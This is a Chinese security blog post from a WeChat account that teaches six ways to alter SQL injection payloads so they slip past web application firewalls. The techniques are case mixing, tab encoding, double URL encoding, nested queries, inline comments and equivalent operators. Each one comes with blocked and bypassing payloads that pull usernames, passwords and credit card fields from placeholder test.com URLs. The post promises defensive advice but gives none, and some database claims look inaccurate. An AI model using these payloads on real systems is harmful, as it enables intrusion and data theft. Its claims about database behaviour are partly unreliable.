---
title: 实战解析：绕WAF的SQL注入变形技巧思路
url: https://mp.weixin.qq.com/s/5KfLKCYpdjzbatvtVmvoKw
source: Doonsec's feed
date: 2026-01-18
fetch_date: 2026-01-19T03:42:46.584421
---

# 实战解析：绕WAF的SQL注入变形技巧思路

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Aj9tsa4DmOlz8HV1I0qK9pZt69qvHmIia1iahUzzhib0uYJMugL4icouJNd1L0GqRhRUxibdM7PfFhP6EiaHhPxxAt9g/0?wx_fmt=jpeg)

# 实战解析：绕WAF的SQL注入变形技巧思路

原创

m3x1
m3x1

梦醒安全

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Aj9tsa4DmOmra6EI659XoNIvNn9wnMpVqicmqFmpJAwWJA0fw90SqBVOCEicpkLlV63QbNibrCx4BYT4JKia33l1Yg/640?wx_fmt=png&from=appmsg)

免责声明：本公众号内容仅用于知识分享和学习，由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号梦醒安全及作者不为此承担任何责任，一旦造成后果请自行承担！

PART.01

前言

在网络安全攻防对抗中，WAF（Web应用防火墙）是抵御SQL注入攻击的核心防线，但多数WAF依赖“关键字匹配”“语法特征识别”等固定规则，只要精准抓住规则盲区，通过合法的SQL语句变形，就能在授权测试中绕过防护、定位漏洞。本文结合实战场景，拆解6种绕WAF的SQL注入变形思路，同时也为防护方提供对应的加固建议。

PART.02

内容

## 一、大小写变形：利用关键字匹配的大小写敏感盲区

### 核心原理

多数WAF的关键字检测规则对大小写敏感（仅拦截全小写的“`union select`” “`and 1=1`”），但MySQL、SQL Server等主流数据库默认对关键字大小写不敏感，形成“WAF拦截失效，数据库正常执行”的漏洞（PostgreSQL需注意，默认对关键字大小写敏感）。

### 绕过示例

测试环境：目标URL：`http://test.com/product?id=1`

* 拦截示例：`id=1' union select 1,2,database()--+` → WAF触发拦截，日志标记“命中union select关键字规则”；
* 绕过示例：`id=1' UnIoN SeLeCt 1,2,dAtAbAsE()--+` → WAF未拦截，页面成功返回数据库名“test\_db”。

### 注意要点

* 针对PostgreSQL需先执行`show case_sensitive_identifier;`确认配置，若为“on”则该技巧失效；
* 高端WAF（如Cloudflare企业版）已支持大小写不敏感检测，需先测试规则强度。

## 二、关键字拆分：用特殊字符替代固定间隔

### 核心原理

WAF常将“关键字+空格+关键字”视为危险特征（如“union select”），但数据库允许用`%20`（空格URL编码）、`%09`（Tab符URL编码）、`()`等替代空格间隔，打破WAF的特征识别逻辑。

### 绕过示例

测试环境：目标URL：`http://test.com/category?id=2`

* 拦截示例：`id=2' union select 1,group_concat(username) from user--+` → WAF拦截，匹配“union select from”风险特征；
* 绕过示例1（`%09`替代空格）：`id=2' union%09select 1,group_concat(username)%09from%09user--+`；
* 绕过示例2（`()`包裹关键字）：`id=2' union(select)1,group_concat(username)from(user)--+`；

### 注意要点

* `%09``%0A`

  （换行符）需确保服务器正常解析（Apache、Nginx默认支持）；
* 可结合“大小写+拆分”双重变形（如`UnIoN%09SeLeCt`）提升绕过成功率。

## 三、编码转换：利用WAF解码不彻底漏洞

### 核心原理

WAF对URL参数通常仅“单次解码”，而服务器会“多次解码”直至无法解析。将关键符号（`'``=`）多次URL编码/Unicode编码，可让WAF解码后无法识别危险特征，服务器解码后正常执行。

### 绕过示例

测试环境：目标URL：`http://test.com/login?username=admin`

* 拦截示例：`username=admin' or '1'='1` → WAF拦截，检测到单引号注入风险；
* 绕过示例：将单引号`'`进行2次URL编码（`%27`→`%2527`），构造语句：`username=admin%2527 or %25271%2527=%25271`；

### 注意要点

* 优先尝试2次URL编码，超过3次易导致服务器解析失败；
* Unicode编码（如`'`的`\u0027`）仅适用于支持中文解析的场景。

## 四、多语句嵌套：用复杂结构迷惑WAF规则

### 核心原理

WAF对简单语句结构的检测更精准，对嵌套子查询、存储过程调用等复杂结构识别能力弱。将注入语句嵌套在合法SQL语法中，可让WAF误判为正常查询，数据库逐层解析执行。

### 绕过示例

测试环境：目标URL：`http://test.com/transaction?id=100`

* 拦截示例：`id=100' union select 1,credit_card from user where id=1--+` → WAF拦截，匹配“union select ... from user”风险特征；
* 绕过示例1（子查询嵌套）：`id=100' union select 1,(select credit_card from (select credit_card from user where id=1) as t)--+`；
* 绕过示例2（存储过程嵌套，仅SQL Server）：`id=100'; exec('se'+'lect credit_card from user where id=1')--+`；

### 注意要点

* 嵌套层数不宜超过3层，避免数据库执行超时；
* 存储过程调用需确认权限（如SQL Server的exec需execute权限）。

## 五、注释干扰：用合法注释打断检测特征

### 核心原理

WAF会识别“关键字+符号”的连续特征（如“or 1=1”），若在关键字中间插入数据库支持的合法注释（`/**/`“`--`”“`#`”），可打断WAF的特征匹配，而数据库会忽略注释、正常解析语句。

### 绕过示例

测试环境：目标URL：`http://test.com/user?id=1`

* 拦截示例：`id=1' or 1=1--+` → WAF拦截，提示“检测到OR条件注入风险”；
* 绕过示例1（`/**/`拆分关键字）：`id=1' o/**/r 1=1--+`；
* 绕过示例2（注释插入无关内容）：`id=1' or 1-- abc=1--+`；

### 注意要点

* 不同数据库注释语法不同：MySQL支持`#`、`--` （需加空格）、`/**/`；Oracle仅支持“--”和`/* */`，不支持`#`；
* 避免过度插入注释，防止语句长度超出WAF“最大请求长度限制”触发拦截。

## 六、特殊字符替代：用等价语法绕过关键字检测

### 核心原理

SQL语法存在大量“等价字符”（如“+”和“||”均用于字符串拼接，“=”和“like”可替代数值比较），若WAF拦截某类关键字/符号，可用等价字符替代，同时保证数据库正常执行。

### 绕过示例

测试环境：目标URL：`http://test.com/search?keyword=test`

* 拦截示例：`keyword=test' and (select count(*) from admin)>=1--+` → WAF拦截，匹配“and (select)”风险特征；
* 绕过示例1（like替代=）：`keyword=test' and (select count(*) from admin) like 1--+`；
* 绕过示例2（||替代+拼接字符串）：`keyword=test' union select 1,username||password from admin--+`；

### 注意要点

* 等价字符需匹配数据库类型：MySQL用“+”拼接，Oracle用“||”，PostgreSQL两者均可；
* like替代=仅适用于数值比较，字符串比较需注意通配符（如`username like 'admin%'`）。

PART.03

交流群

欢迎大家加入我的交流群：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Aj9tsa4DmOl6rB8SMy4SCnsKVhiaE3iaX3dCZ85qFkQztjEiacNZAlk4Wg0vwMpwIInlIfmCgOUltCfhRrtpHB6Fw/640?wx_fmt=jpeg&from=appmsg)

如果链接过期，可以在公众号后台点击下方菜单“加群”添加我wx，备注“加群”

PART.04

往期推荐

![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXz4Qht144X0wjJcOMqPwhnh3ptlbTtxDvNMF8NJA6XbDcljZBsibalsVQ/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=49)

![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&wxfrom=5&tp=webp&wx_lazy=1#imgIndex=50)

**![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp#imgIndex=51)往期好文![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp#imgIndex=52)**

![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&wxfrom=5&tp=webp&wx_lazy=1#imgIndex=53)

[高危预警！Apache Tika曝XXE漏洞(CVE-2025-66516)，可窃取服务器文件](https://mp.weixin.qq.com/s?__biz=MzYzNjAwMjQ3OQ==&mid=2247484832&idx=1&sn=df2960e41ef09a051e17164c62d7a055&scene=21#wechat_redirect)

[Java漏洞实战平台上线！覆盖30+安全场景](https://mp.weixin.qq.com/s?__biz=MzYzNjAwMjQ3OQ==&mid=2247484833&idx=1&sn=f146f4facccde026a3bd980f979fd07b&scene=21#wechat_redirect)

[【效率翻倍】14款渗透必备插件，这款Firefox定制版帮你一键集齐](https://mp.weixin.qq.com/s?__biz=MzYzNjAwMjQ3OQ==&mid=2247484834&idx=1&sn=6ce6214a51634deecb9ca3621d2f6096&scene=21#wechat_redirect)

[【AI靶场练习】Gandalf靶场过关wp解析](https://mp.weixin.qq.com/s?__biz=MzYzNjAwMjQ3OQ==&mid=2247484882&idx=1&sn=fb9717659963fa3427a7dc5e9aa2fcd3&scene=21#wechat_redirect)

[【AI靶场练习】Prompt Injection lab靶场wp解析](https://mp.weixin.qq.com/s?__biz=MzYzNjAwMjQ3OQ==&mid=2247484883&idx=1&sn=af3596bcad9aaa6938faa890bab3c2f1&scene=21#wechat_redirect)

[深挖HTTP请求走私漏洞：原理、利用与防御](https://mp.weixin.qq.com/s?__biz=MzYzNjAwMjQ3OQ==&mid=2247484905&idx=1&sn=bc94966f0c1e940688f3f8eb9dfc1d4c&scene=21#wechat_redirect)

[自开CVE-2025-55182 漏洞检测与利用工具（GUI版）使用指南](https://mp.weixin.qq.com/s?__biz=MzYzNjAwMjQ3OQ==&mid=2247484916&idx=1&sn=b1f6b5a0f8d6a3a6cd5d321d7f704b52&scene=21#wechat_redirect)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/Aj9tsa4DmOkZPxhNKzmxYAFNVo1xp2AJn0FbA0eY8VlxwaCS4jghGjibkxuBVsyq6pibxukxW17wblRLkbcL5ceQ/0?wx_fmt=png)

梦醒安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/Aj9tsa4DmOkZPxhNKzmxYAFNVo1xp2AJn0FbA0eY8VlxwaCS4jghGjibkxuBVsyq6pibxukxW17wblRLkbcL5ceQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过